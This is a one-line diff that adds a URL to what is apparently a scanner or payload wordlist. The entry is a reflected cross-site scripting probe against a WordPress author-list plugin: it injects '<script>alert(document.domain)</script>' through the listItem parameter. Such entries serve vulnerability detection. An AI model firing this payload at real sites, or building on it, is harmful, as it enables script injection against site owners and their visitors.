@@ -1,0 +1,1 @@
+/wp-content/plugins/knr-author-list-widget/knrAuthorListCustomSortSave.php?listItem[]=<script>alert(document.domain)</script>
